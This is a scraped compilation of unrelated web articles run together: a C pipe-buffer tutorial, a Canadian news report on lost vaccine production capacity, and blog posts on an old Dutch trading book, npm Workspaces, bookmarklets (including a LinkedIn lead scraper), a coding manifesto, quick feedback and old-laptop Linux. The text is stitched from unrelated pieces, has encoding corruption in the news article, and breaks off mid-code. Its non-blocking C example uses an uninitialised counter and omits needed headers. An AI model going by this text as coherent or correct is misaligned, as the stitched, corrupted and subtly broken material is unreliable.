<span>static</span> <span>void</span>
<span>sighand</span>(<span>int</span> s)
{

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);
	exit(EXIT_SUCCESS);
}

<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (signal(SIGALRM, sighand) <span>==</span> SIG_ERR)
		err(EXIT_FAILURE, <span>"signal"</span>);

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	alarm(<span>5</span>); <span>/* arm the alarm to 5 seconds */</span>

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* if we ended up here, there was an error */</span>
	err(EXIT_FAILURE, <span>"write"</span>);
}</code></pre></div>

<p>Alternatively, one could set the pipe end in the non-blocking mode.
This can be achieved with
the <code>fcntl(2)</code> call and the <code>F_SETFL</code> + <code>O_NONBLOCK</code> arguments.</p>

<p>The <code>O_NONBLOCK</code> mode on pipes causes the following change:</p>

<ul>
<li>Writing into a full pipe buffer returns with <code>-1</code> and errno <code>EAGAIN</code>, instead of blocking.</li>
</ul>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>

</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];
	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (fcntl(fildes[<span>1</span>], F_SETFL, O_NONBLOCK) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"fcntl"</span>);

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* filter real errors from the unavailable for now resource */</span>
	<span>if</span> (errno <span>!=</span> EAGAIN)
		err(EXIT_FAILURE, <span>"write"</span>);

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>There are a few other kernel specific approaches to guess the maximum buffer size
that can be stored inside the kernel. One of them is to read <code>PIPE_SIZE</code> from <code>&lt;sys/pipe.h&gt;</code>
on BSD systems, but given that it is 16384 for FreeBSD, NetBSD and OpenBSD, it’s merely an
internal implementation specific header.</p>

<p>In order to make the picture fuller, we need to mention that the FreeBSD and NetBSD kernels
allow tuning of the pipe behavior and investigating
the kernel virtual address spent on the buffers.</p>

<p>FreeBSD provides the following <code>sysctl</code> knobs:</p>

<ul>
<li><code>kern.ipc.piperesizeallowed</code>: Pipe resizing allowed</li>
<li><code>kern.ipc.piperesizefail</code>: Pipe resize failures</li>
<li><code>kern.ipc.pipeallocfail</code>: Pipe allocation failures</li>
<li><code>kern.ipc.pipefragretry</code>: Pipe allocation retries due to fragmentation</li>
<li><code>kern.ipc.pipekva</code>: Pipe KVA usage</li>
<li><code>kern.ipc.maxpipekva</code>: Pipe KVA limit</li>
</ul>

<p>NetBSD:</p>

<ul>
<li><code>kern.pipe.maxbigpipes</code>: Maximum number of “big” pipes</li>
<li><code>kern.pipe.nbigpipes</code>: Number of “big” pipes</li>
<li><code>kern.pipe.kvasize</code>: Amount of kernel memory consumed by pipe buffers</li>
</ul>

<p>OpenBSD does not provide any similar <code>sysctl</code> functionality for pipes.</p>

<p>What are “big” pipes in NetBSD? They are special case pipes that exceed <code>PIPE_SIZE</code> …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>TORONTO -- 
	In the race to develop and produce a COVID-19 vaccine, Canada is on the sidelines despite its once notable status as a global source for life-saving injections.</p>
<p>
	Canada lost that standing long ago, as Prime Minister Justin Trudeau explained this week, which means even if the country had developed its own novel coronavirus vaccine, there would be no means to produce it on the scale required.</p>
<p>
	â€œWe used to have [production capacity] decades ago but we no longer have it,â€� Trudeau said <a href="https://www.ctvnews.ca/health/coronavirus/pm-touts-deal-for-26k-doses-of-covid-19-therapeutic-seeks-to-temper-vaccine-expectations-1.5202350" target="_blank">Tuesday in Ottawa</a>.</p>
<p>
	How did it get to this point? Canadian administrations simply took their â€œeye off the ball,â€� said Earl Brown, an infectious disease expert and a former member of the H1N1 vaccine task group in Canada. After that pandemic, a review found that vaccine production capacity was â€œright at the topâ€� of the list of problems, he said. It wasnâ€™t always that way.</p>
<ul>
	<li>
		<a href="https://www.ctvnews.ca/newsletters/the-covid19-brief-newsletter-signup" target="_blank"><em><strong>Newsletter sign-up: Get The COVID-19 Brief sent to your inbox</strong></em></a></li>
</ul>
<p>
	â€œWe had great vaccine producers in Canada -- world leaders essentially -- 50 years ago,â€� he told CTVâ€™s Your Morning on Wednesday. There was Connaught Laboratories in Toronto, which was known for producing insulin to treat diabetes and inoculants for diphtheria and polio, and Institut Armand Frappier in Montreal that produced vaccines, including one for tuberculosis, he noted.</p>
<p>
	â€œThe problem was they had a poor business model,â€� said Brown. â€œThese were vaccine companies spun off from universities, so there was indirect funding and they had a model of not making so much profit.â€�</p>
<p>
	So they were eventually sold, Montreal's Frappier lab to British multinational GlaxoSmithKline and Connaught, through a series of mergers, to French multinational Sanofi Pasteurâ€‹ after Brian Mulroneyâ€™s Progressive Conservative government's program of privatizationâ€‹. The labs now have a â€œtighter production line and not so much capacity,â€� said Brown.</p>
<p>
	The inability to mount a domestic production campaign means that the Canadian government must rely on purchase agreements with top U.S. and European pharmaceutical brands, including <a href="https://www.ctvnews.ca/health/coronavirus/a-long-way-from-lab-bench-to-bedside-virus-experts-urge-covid-19-vaccine-caution-1.5199238" target="_blank">Pfizer, Moderna</a> and <a href="https://www.ctvnews.ca/health/coronavirus/astrazeneca-covid-19-vaccine-shown-to-be-effective-and-cheaper-1.5200355" target="_blank">AstraZeneca</a>, to produce and provide the shots to Canadians once the vaccines are approved by Health Canada. In the absence of a domestic candidate, Ottawa has ordered as many as 414 million doses of COVID-19 vaccine candidates from seven different companies.</p>
<p>
	<strong>'A MAJOR GLITCH'</strong></p>
<p>
	There are some promising vaccine candidates in development across Canada, including Quebecâ€™s Medicago and Saskatchewanâ€™s VIDO-InterVac, but the companies lack the means to produce them here. What would that mean for rollout should those candidates be successful?&nbsp;</p>
<p>
	â€œThatâ€™s a major glitch,â€� said Brown. â€œYouâ€™re going to have to get a partner, somebody whoâ€™s got the ability to do that and then you have to get them onside, tuned up, send them your vaccine, get it produced and bottled. Not the best way to do it.â€�</p>
<p>
	For those Canadian companies to mount production campaigns on their own will take time -- and a lot of it, they have said. VIDO-InterVac said it has plans to build a facility in one year, but that it would take another still to get it in operating shape. â€œThatâ€™s not the time frame you like,â€� said Brown.</p>
<p>
	In the meantime, Canadians will have to rely on speedier countries with approved COVID-19 vaccines to provide doses, but Canadians won't be prioritized ahead of their own people. â€œCountries like the United States, Germany and the U.K. do have domestic pharmaceutical facilities, which is why theyâ€™re obviously going to prioritize helping their citizens first,â€� Trudeau said on Tuesday in Ottawa.</p>
<p>
	To help Canadians first, the federal government should set up a Crown corporation to produce vaccines, suggests Joel Lexchin, a professor emeritus with York Universityâ€™s School of Health Policy and Management.&nbsp;</p>
<p>
	â€œItâ€™s one thing if we give up the ability to domestically make something like laundry detergent. We can all live without laundry detergent. But when it comes to medications and vaccines, those are critical for the health of Canadians and we should be able to make them ourselves,â€� he told CTV National News. â€œNot only will the ability to domestically produce them ensure that Canadians get the care that they need, but we can also fulfill our human rights obligations by exporting them at low cost to low- and middle-income countries.â€�</p>
<p>
	<strong>'GROSS INCOMPETENCE'</strong></p>
<p>
	The reliance on other countries and private companies is upsetting critics of Trudeau, who said Tuesday that his administration has begun funding domestic vaccine production capacity because â€œwe never want to be caught short again.â€�&nbsp;</p>
<p>
	â€œThis is gross incompetence thatâ€™s going to cost Canadians their lives and their jobs,â€� said Conservative health critic Michelle Rempel Garner on Tuesday from Parliament Hill.</p>
<p>
	But criticism toward one governmentâ€™s inaction may often easily be directed at another with hindsight, countered Brown on Your Morning.</p>
<p>
	â€œWhen you have the problem, you look back and say â€˜We should have done something, shouldnâ€™t we?â€™â€� he said.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1684">
	<!-- .entry-header -->

	
	
	<div>
		<p><a href="http://bilalhafeez.com/wp-content/uploads/2018/09/DutchStock.jpg"><img loading="lazy" src="http://bilalhafeez.com/wp-content/uploads/2018/09/DutchStock.jpg" alt="" width="267" height="285"></a></p>
<p>In the 1600s, the world’s first stock exchange was established in Amsterdam. In 1688, a trader by the name of Josef de la Vega wrote “<a href="https://www.amazon.co.uk/Confusion-Confusiones-Portions-Descriptive-Amsterdam/dp/1614274517/ref=sr_1_1?ie=UTF8&amp;qid=1536921443&amp;sr=8-1&amp;keywords=confusion+de+confusiones">Confusion Of Confusions</a>” – the world’s oldest surviving account of trading stocks. The book is an amazing record of the business. Yet despite being written over 300 years ago, it sounds eerily familiar to our markets today.<span id="more-1684"></span></p>
<p><strong>Addiction</strong></p>
<p>First off, De la Vega has no illusions about the dark side of the industry. He describes the Dutch stock market as “the fairest and most deceitful in Europe…the finest and the most vulgar on earth.” He laments that “this business has been converted into a game, and merchants [concerned in it] have become speculators.” And “what is worse, a portion of the stock brokers have become card-sharpers [hustlers, exploiters]”. Yet, “it is great error to assume that you can withdraw [temporarily] from the Exchange or that you can gain peace of mind when you cease to meet with the other speculators…He who entered the circle of the Exchange is in eternal agitation and sits in a prison, the key of which lies in the ocean and the bars of which never open.”</p>
<p><strong>4 Principles</strong></p>
<p>With this backdrop, he writes about “some precepts” that he lives by:</p>
<p>1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “Never give anyone the advice to buy or sell shares” since the “most benevolent piece of advice can turn out badly”</p>
<p>2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “Take every gain without showing remorse about missed profits, because an eel may escape sooner than you think”. Put another way, “it is wise to enjoy that which is possible without hoping for …the persistence of luck.”</p>
<p>3)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “Profits on the exchange are the treasures of goblins. At one time they may be carbuncle stones [gemstones], then coals, then diamonds, then flint-stones, then morning dew, then tears”. I guess he means investment gains are not permanent.</p>
<p>4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “Whoever wishes to win this game must have patience and money, since the values are so little constant and the rumours so little founded on truth. He who knows how to endure blows without being terrified by the misfortune resembles the lion who answers the thunder with a roar, and is unlike the hind [deer] who, stunned by the thunder, tries to flee.”</p>
<p><strong>The Mind Of a Trader</strong></p>
<p>He has a keen eye on the psychology of the traders. Speculators “are very clever in inventing reasons for a rise in the price of shares on occasions when there is a declining tendency.” And “when speculators talk, they talk shares…when they look at something, it is shares that they see…But what surpasses these enormities…is the fact that the speculator…struggles against his own will …and is at odds with his own decisions…If, for example, there arrives a piece of news which would induce the speculator to buy, while the atmosphere prevailing at the stock exchange forces him to sell, his reasoning fights his own good reasons…”</p>
<p>He goes on to talk about price formation: “the expectation of an event creates a much deeper impression upon the exchange than the event itself. When large dividends or rich imports are expected, shares will rise in price; but if the expectation becomes a reality, the shares often fall; for the joy over the favourable development and the jubilation over lucky chance have abated in the meantime.”</p>
<p><strong>Bulls and Bears</strong></p>
<p>He splits traders into two classes. “The first class consists of the bulls. They start their operations by purchases…They always desire a rise in the price of the shares; they hope that by reason of good news the market will be suddenly stirred up, and that prices will rise high rapidly. The second faction consists of the bears…The bears always begin operations by sales…These bears must be fled like the plague, and one must take their part only on extraordinary occasions”</p>
<p>More colourfully, he describes them as follows:</p>
<p>“The bulls are like the giraffe which is scared of noting…They love everything, they praise everything, they exaggerate everything…the bulls make the public believe that their tricks signify wealth and that crops grow on graves…The bears on the contrary, are completely ruled by fear, trepidation and nervousness. Rabbits become elephants, brawls in a tavern become rebellions, faint shadows appear to them as signs of chaos.”</p>
<p><strong>Derivatives</strong></p>
<p>Finally, it was remarkable how sophisticated the instruments available to trade were: they could trade cash markets, forwards and even options:</p>
<p>[On managing downside]: “The Dutch call the option business “opsies” a term derived from the Latin word “optio”, which means choice, because the payer of the premium has the of delivering the shares…Give “opsies” or premiums, and there will only be limited risk to you, while the gain may surpass all your imaginings…it is impossible to lose&nbsp; more than the price of the premium</p>
<p>So, looks like nothing much has changed!</p>

November 26, 2020 | https://hyperfoo.io/posts/npm-7-workspaces-1 | <a href="https://web.archive.org/web/*/https://hyperfoo.io/posts/npm-7-workspaces-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The newest major release of <a href="https://npmjs.com/">npm</a> came out in October this year. Together with it came one very anticipated feature: <strong>npm Workspaces</strong>.</p>
<p>Workspaces are a way to work with repositories that have multiple packages - more than one <code>package.json</code> file. These projects are also known as <em>monorepos</em>.</p>
<p>But npm is a bit late to the party. Managing monorepos is already possible with other package managers such as <a href="https://yarnpkg.com/">Yarn</a> and <a href="https://pnpm.js.org/">pnpm</a>. Libraries like <a href="https://lerna.js.org/">Lerna</a> also bring swift tools to work with multi-package repositories.</p>
<p>That being said, npm Workspaces are still a step in the right direction.</p>
<h2>What changes with Workspaces?</h2>
<p>If you have a single <code>package.json</code> on your repository, you will not need Workspaces and nothing is going to change for you.</p>
<p>In multi-package repository, npm will now scan your folders looking for other packages and dependencies to install. This was made possible after changes made to <a href="https://github.com/npm/arborist">Arborist</a>, npm's dependency tree manager.</p>
<p>Duplicated dependencies across packages will be <strong>hoisted</strong>. This means they are going to be stored on the top-level of the packages. This is done mainly for performance reasons - we all know how big <code>node_modules</code> can get.</p>
<h2>Using Workspaces</h2>
<p>You can try Workspaces today by updating your npm to version 7. To update, run this command on your terminal:</p>
<pre><code>npm install -g npm@7</code></pre>
<blockquote>
<p>Version 7 is still not marked as <code>latest</code>, so running <code>npm install -g npm</code> will still install 6.x.</p>
</blockquote>
<p>If you install Node.js 15 today, it should already come with npm 7.</p>
<p>You can create a minimal monorepo setup to play around. Here’s an example of how a simple repository structure would look like:</p>
<pre><code>.
├── package.json
└── packages
    ├── package-a
    │   └── package.json
    └── package-b
        └── package.json</code></pre>
<p>A <code>package.json</code> file on the root of your repository is still needed, even if you don't have any dependencies there. On that file you will tell npm where your subpackages live by adding the <code>workspaces</code> entry:</p>
<pre><code>
{
  
  <span>"workspaces"</span>: [
    <span>"./packages/*"</span>
  ]
}</code></pre>
<p>With this, when you run <code>npm install</code> on the root, npm will be smart enough to install <code>package-a</code> and <code>package-b</code> dependencies.</p>
<p>I made a GitHub repository with this example if you wanna check it in more details. Here’s the link: <a href="https://github.com/ruanmartinelli/npm-workspaces-demo">npm-workspaces-demo</a>.</p>
<h2>Are Workspaces ready?</h2>
<p><em>“Should I change all my code to use npm Workspaces?”</em></p>
<p>Workspaces are definitely a welcome addition, but a bit more work is needed to make it a complete solution for managing monorepos.</p>
<p>As of the writing of this post, it still hasn't reached feature parity with Lerna, pnpm or Yarn Workspaces. Technical details about how Workspaces will work are still being voted and discussed on <a href="https://github.com/npm/rfcs/pull/117">GitHub issues</a>.</p>
<p>The toolset is still limited. There is no <code>npm workspaces</code> subcommand or anything equivalent. If you want to be an early adopter, you’ll need to combine it with tools like <a href="https://www.npmjs.com/package/nx">nx</a> or Lerna for a complete monorepo workflow.</p>
<h2>npm Workspaces vs. Yarn Workspaces</h2>
<p>Yarn is the second biggest package manager for JavaScript, so it might be fair to make a comparison.</p>
<p>Yarn Workspaces is around for much longer (it was launched somewhere around 2017). It is a complete feature. The <code>yarn workspaces</code> inteface already gives you the tooling that npm is still missing. npm Workspaces is still an <a href="https://en.wikipedia.org/wiki/Minimum_viable_product">MVP</a>.</p>
<p>My personal opinion is that npm Workspaces shouldn't differ that much from existing solutions like Yarn Workspaces - it even borrowed the "Workspaces" name! I believe we can expect a similar API and an easy way to switch between other implementations (but again, that's an opinion).</p>
<h2>What’s next for npm Workspaces?</h2>
<p>We can expect new things to come for Workspaces. It will not be just an improvement to the <code>npm install</code> command (<a href="https://github.com/npm/rfcs/blob/latest/implemented/0026-workspaces.md#rationale-and-alternatives">source</a>).</p>
<p>On GitHub discussions you can see that Workspaces will evolve in a way to bring tools for a more complete workflow.</p>
<p>If you want to keep up-to-date with Workspaces development and new features, there are a few things you can do:</p>
<ul>
<li>Watch the ongoing Workspaces RFC discussions on <a href="https://github.com/npm/rfcs/">this repo</a>;</li>
<li>Keep an eye on the <a href="https://blog.npmjs.org/">npm Blog</a> for new releases;</li>
<li>Subscribe to <a href="https://hyperfoo.io/">hyperfoo.io</a>'s newsletter, where I will publish a fresh new article about the next Workspaces iteration. :-)</li>
</ul>
<p>Thanks for reading!</p>

        <h2>Everything Old is New Again</h2>

        <p>
          Bookmarklets are old newsâ€” According to Wikipedia, <a href="https://en.wikipedia.org/wiki/Bookmarklet" target="_blank" rel="noopener noreferrer">bookmarklets have been around since the year 2000</a>.
          The usefulness and popularity of bookmarklets has certainly waned
          in the last 20 years as browser extensions have grown in popularity. However, you can still create bookmarklets and
          unlike modern browser extensions, bookmarklets work on all major web browsers (even on mobile).
        </p>

        <p>
          I maintain a few products that rely on browser extensions to provide convenient product functionality.
          When it comes to your product and business, Google's web store is

          I have been experimenting with the idea of offering a bookmarklet in addition to my product's browser
          extension. At the very least, I would like to offer a bookmarklet as an extension fallback in the event
          things ever go south with Google.
        </p>

        <p>
          Unfortunately (or, <i>fortunately</i> depending on how you look at it) bookmarklets have been
          stripped of some useful functionality. Due to security concerns most websites place content policies
          on their webpages. These policies limit which resources and domains can be used within the context
          of the page.
        </p>

        <p>
          As a result of the content policies bookmarklets face a few restrictions:
        </p>

        <ul>
          <li>You can no longer rely on loading styles, html or javascript from a remote server.</li>
          <li>You are restricted by the amount of data and code you can fit in a single URL (which is roughly 2,000 characters).</li>
        </ul>

        <p>
          You are probably thinking bookmarklets are useless with such restrictions. However, there are quite a few
          upsides to bookmarklets.
        </p>

        <h2>Restricted but not useless.</h2>

        <p>
          Bookmarklets may not share the same level of control and freedom browser extensions have, but they do offer a number of
          upsides browser extensions are unable to provide. Here are a few upsides to consider:
        </p>

        <ol>
          <li>
            You don't need to rely on a third party web store for distribution.
          </li>
          <li>The same bookmarklet code works everywhere; even on mobile browsers.</li>
          <li>
            No automatic updates. I prefer this over the extension model of automatic updates. In the
            extension world you never know what code is running in your browser at any given point in time. If
            an extension is hijacked or sold to a malicious third party you could be running malicious code.
          </li>
          <li>
            Bookmarklets can skirt by a strict IT department. Believe it or not, I have enterprise customers that
            are unable to use my product's extension because their IT department forbids browser extensions.
          </li>
        </ol>

        <p>
          Bookmarklets are far from perfect and may not be ideal for your specific needs.
          There are two patterns I commonly see where bookmarklets remain as viable alternatives to browser
          extensions. The two common patterns I see can be summarized in the following ways:
        </p>

        <ol>
          <li>
            You want to modify the target page in some way.
          </li>

          <li>
            You want to extract data and present it locally or transfer the data to another service.
          </li>
        </ol>

        <p>
          I will demonstrate both of the patterns above with a few bookmarklets I created for this blog post.
          The complete source code for all of the demonstrated bookmarklets can be found on <a href="https://prophitt.me/src">my source code page</a>.
        </p>

        <p>Here's a preview of the four bookmarklets:</p>

          </p></div>
        </div>

        <h2>Pattern 1: Modifying Pages (Div Highlighter)</h2>

        <p>
          Note, all demoed bookmarklets can be "installed" by dragging and dropping their respective heading link into your bookmark tool
          bar. You can also manually create a bookmarklet by copying and pasting the provided location string into the location
          field of a new bookmark.
        </p>

        <p>
          The simplest of all use cases for a bookmarklet is to make a temporary modification to a web page. For example,
          removing an auth wall, changing a page from "light" mode to "dark" mode, etc. To demonstrate how to accomplish this
          functionality with a bookmarklet, I took a Chrome browser extension and converted it into a bookmarklet with identical
          functionality.
        </p>

        <p>
          After some digging around I found the <a href="https://github.com/itsHobbes/div-highlighter" target="_blank" rel="noopener noreferrer">div-highlighter</a>
          extension by <a href="https://github.com/itsHobbes" target="_blank" rel="noopener noreferrer">itsHobbes</a>. When clicked the extension highlights all divs
          on the current page with a random border and background color. This is a common debugging technique and the extension is a
          great example for this pattern. I took the code from the extension and wrapped it inside of a function to
          prevent polluting the global namespace.
        </p>

        <p>The complete code can be seen below:</p>

        <pre><code>(function () {
  var MIN_PARENT_COUNT = 0;
  var MAX_PARENT_COUNT = 3;

  function rgba() {
      var o = Math.round, r = Math.random, s = 255;
      return 'rgba(' + o(r() * s) + ',' + o(r() * s) + ',' + o(r() * s) + ',' + 0.4 + ')';
  }

  var divs = document.getElementsByTagName('div');

  for (var i = 0; i &lt; divs.length; i++) {
      if (divs[i].offsetHeight == 0 || divs[i].offsetWidth == 0) {
          continue;
      }

      var parents = 0;
      var node = divs[i];

      while (node != null) {
          if (node.tagName == 'DIV') {
              parents++;
          }

          node = node.parentNode;
      }

      if (parents &gt;= MIN_PARENT_COUNT &amp;&amp; parents &lt;= MAX_PARENT_COUNT) {
          var color = rgba();

          divs[i].style.boxSizing = 'border-box';
          divs[i].style.border = '2px solid ' + color;
          divs[i].style.backgroundColor = color;
      }
  }
})();
</code></pre>

        <p>The minified location string is as follows:</p>

        <pre><code>javascript:(function(){var MIN_PARENT_COUNT=0;var MAX_PARENT_COUNT=3;function rgba(){var o=Math.round,r=Math.random,s=255;return"rgba("+o(r()*s)+","+o(r()*s)+","+o(r()*s)+","+.4+")"}var divs=document.getElementsByTagName("div");for(var i=0;i&lt;divs.length;i++){if(divs[i].offsetHeight==0||divs[i].offsetWidth==0){continue}var parents=0;var node=divs[i];while(node!=null){if(node.tagName=="DIV"){parents++}node=node.parentNode}if(parents&gt;=MIN_PARENT_COUNT&amp;&amp;parents&lt;=MAX_PARENT_COUNT){var color=rgba();divs[i].style.boxSizing="border-box";divs[i].style.border="2px solid "+color;divs[i].style.backgroundColor=color}}})();
</code></pre>

        <p>
          You may notice the code for itsHobbes' extension and the bookmarklet are identical. Bookmarklets and extension content scripts
          work in essentially the same way.
        </p>

        <h2>Pattern 2: Remote Data Extraction (Wayback Machine)</h2>

        <p>
          Another commonly seen pattern involves the extraction of some data from the page and the transfer of the data to another
          remote location. This pattern is often used to "share a post", "post a message", etc. For example, the <a href="https://news.ycombinator.com/bookmarklet.html" target="_blank" rel="noopener noreferrer">Hacker News bookmarklet</a>
          uses this pattern.
        </p>

        <p>
          To demonstrate this pattern I created a simple bookmarklet that will determine the hostname and protocol for the current web page and open the page up within Wayback Machine's
          archive. Essentially, we are extracting the url and transferring it to Wayback Machine in a new browser tab.
        </p>

        <p>The complete code can be seen below:</p>

        <pre><code>(function () {
  var host = location.protocol + "//" + location.hostname;
  window.open("https://web.archive.org/web/*/" + host, "_blank", "noreferrer,noopener");
})()
</code></pre>

        <p>The minified location string is as follows:</p>

        <pre><code>javascript:(function(){var host=location.protocol+"//"+location.hostname;window.open("https://web.archive.org/web/*/"+host,"_blank","noreferrer,noopener")})();
</code></pre>

        <p>
          The demonstration above only extracted the protocol and host address from the web page but you can extract any information
          from the page. The only limitation is how much data you can safely fit in a url.
        </p>

        <p>
          The general consensus is you should limit url length to 2,000 characters or less for maximum browser support. I have tested
          Chrome and Firefox with very large urls (over 40,000 characters) and both worked as intended. However, it is probably a good
          idea to go with the general consensus unless you have a good reason not to.
        </p>

        <h2>Pattern 2: Local Data Extraction (LinkedIn Search Result Scraper)</h2>

        <p>
          The data extraction example above extracted simple information from a web page and transferred it to another domain via a new tab.
          Another common variation of the pattern involves locally downloading data instead of transferring the data to a new location.
        </p>

        <p>
          To demonstrate this I created a bookmarklet that scrapes leads from a LinkedIn search results page and downloads the leads in a CSV file
          for local processing.
        </p>

        <p>The complete code can be seen below:</p>

        <pre><code>(function () {
  var links = document.querySelectorAll('a[data-control-name="search_srp_result"]');

  if (links.length === 0) return;

  function escape(s) {
    return '"' +  s.replace('"', '""') + '"';
  }

  function download(data) {
    var blob = new Blob([data], {type: 'text/csv'}),
        e    = document.createEvent('MouseEvents'),
        a    = document.createElement('a')

    a.download = 'data.csv';
    a.href = window.URL.createObjectURL(blob)
    a.dataset.downloadurl =  ['text/csv', …</code></pre></article></div>

<p>We use software for our everyday needs because we want to get something done. We have goals to achieve and things to do.</p>
<p>The software we use is coded by brave programmers that have their own goals. Most of the time there is an overlap between their goals and ours.</p>
<p>Over time these will diverge.</p>
<p>This means that the tools we depend on grow features we don't use or understand. There will be bugs in these code parts which will prevent us from reaching our goals.</p>
<p>So we are at a fork in the road:</p>
<ul>
<li>We have the choice of trying to understand the code and fix it.</li>
<li>We have the choice of trying another program, whose creator's goals are closer to ours.</li>
<li>We also have the choice of coding the software ourself.</li></ul>
<p>All but the last path mean endless seeking, evaluating and further deviation from our goals. Therefore we replace programs we do not understand fully with our own implementation.</p>
<p>The followers of the Code It Yourself Manifesto believe in these things:</p>
<ul>
<li>We implement it according to our own goals.</li>
<li>We make mistakes and learn from them.</li>
<li>We learn how our tools we depend on need to work.</li>
<li>We gain a deep understanding of our problem domain.</li></ul>
<p>We still embrace sharing of ideas and code.</p>
<p>Sharing is only possible if we are excellent developers to each other. The next developer reading our code will be us in a not so distant future. Coding It Ourselves means we will document our code, clearly stating the goal of the software we write.</p>
<p>Together we enjoy the diversity of implementations and ideas.</p>
<p>We encourage our colleagues to</p>

<p>The book <a href="https://www.goodreads.com/book/show/27316166-the-effective-manager">The Effective Manager</a> says you only need 5 to 15 seconds to deliver effective feedback. Here are the 4 steps:</p>



<ol><li>Ask (“Can I give you some feedback?”)</li><li>State the behavior (“When you X…”)</li><li>State the impact (“…the result is Y.”)</li><li>Encourage effective future behavior (“Keep it up!” for positive feedback or “Can you change that?” for negative feedback)</li></ol>



<p>Those steps should be followed whether you’re giving positive or negative feedback. </p>



<p>Here’s an example, pasted from the book:</p>



<blockquote><p><strong>Manager</strong>: Can I give you some feedback?<br><strong>Direct</strong>: Sure, boss.<br><strong>Manager</strong>: When you tell my boss bad news before me, even with the best of intentions, I end up getting in a lot of trouble for not knowing before he did. Can you try to tell me first, going forward?</p></blockquote>



<p>Boom, done in seconds. (And if you’re thinking “but it’ll take much longer when you account for the inevitable debate about what actually happened!” then there’s <a href="https://critter.blog/2020/11/27/future-focused-feedback/">an answer for that too</a>.)</p>



<p>The beautiful thing about this rapid feedback is the frequency that it allows. When it only takes a few seconds, why not give feedback every day? Why not 5 times a day? It lowers the threshold of what is worthy of feedback.</p>



<p>One caveat: the book has a 3 question test you have to ask yourself before you can deliver the feedback:</p>



<ol><li>Are you angry? If so, <em>don’t give the feedback</em>.</li><li>Are you focused on the past instead of the future (i.e., reminding them about something they did wrong or punishing them)? If so, <em>don’t give the feedback</em>.</li><li>Are you able to let it go? If not, <em>don’t give the feedback</em>. In other words, if you can’t let it go in terms of how you feel, you <em>should</em> let it go by not giving negative feedback. If you feel an urge to deliver feedback, you’re probably doing it for the wrong reasons.</li></ol>



<blockquote><p>If you’re not angry, if it’s not about the past or about punishment, and if you can let it go, then go ahead and give the feedback.</p></blockquote>



<p>There you have it. 5 second feedback. Lower the threshold for what’s feedback-worthy and delivery a steady stream of rapid feedback every day.</p>

Damn Small Linux on a Libretto 50CT
</a></h3>
<!-- bashblog_timestamp: #202011241930.05# -->
<p>November 24, 2020 — 
Carlos Fenollosa
</p>
<!-- text begin -->

<p>In about 2004 a friend from college got into his hands a series of
<a href="https://download.milesburton.com/Libretto/Datasheets/libretto_50_e.pdf">Toshiba Libretto 50CT</a>.
They all came with Windows 95 pre installed, and we wiped them out
and installed Debian with a 2.2 kernel from floppies, with much pain because of
the unsupported disk drive. I remember it being so difficult that I
don't even want to write about it. But it booted and was able to
run Vim, Links, and connect to the internet. Enough for a
network-enabled typewriter.</p>

<p>I got Richard Stallman to sign mine while it was running GNU/Linux,
but when I bought a regular laptop I stopped using it because,
well, it is too old, and its keyboard is too tiny to type
comfortably with it.</p>

<p><a href="https://cfenollosa.com/blog/img/libretto_closed.jpg"><img src="https://cfenollosa.com/blog/img/libretto_closed.thumb.jpg" alt="The Libretto, closed" title=""></a></p>

<p>The Libretto, closed. It is a tiny machine, a wonderful piece of
engineering.</p>

<p>Around 2012 I found it inside a box at home, working
perfectly, with a battery life of a bit less than an hour—which is incredible for
a 12+ year old machine— and
<a href="http://en.wikipedia.org/wiki/DR-DOS">DR-DOS</a> installed. I can't
remember why I did that, but
<a href="http://en.wikipedia.org/wiki/Golden_Axe">Golden Axe</a> was also
installed, so there's a hint.</p>

<p>I decided to install a modern Linux and, at least, store it on a
working condition to give some justice to Stallman's signature.</p>

<p>There are some tutorials available on the net, but none of them
covered 100% of the hardware support for my machine. Most of them
are also outdated, and refer to distributions that don't exist,
don't have any support or are about unusable nowadays. However, I
took many hints from those tutorials, and I will reference them
accordingly.</p>

<h4>Hardware</h4>

<p>This laptop has a 75 MHz —actually, mine reports 74 MHz— with
<strong>24</strong> MB of RAM, which is an upgrade from the original 16 MB which
are usually bundled. The screen is 640x480, and if you choose a
higher resolution, instead of scaling the image, it only displays
the upper-leftmost 640x480 pixels, leaving the bottom and rightmost
part of the area out of sight.</p>

<p>The mouse device is emulated as a PS/2, and physically is a
"clitoris"-like pointing device. You know what I mean. 
Working with the X windows is a pain in the neck because the
location of the mouse and buttons isn't very ergonomic, and clicking on a button makes
the whole screen move on its hinges. </p>

<p>Next to the mouse there is a
speaker which is similar in quality to those of a modern
smartphone.</p>

<p>This device doesn't have any extension port other than a dock
connector for a dock I don't have, and a 16-bit PCMCIA slot, which
you will need for the network card. It doesn't have a COM port or
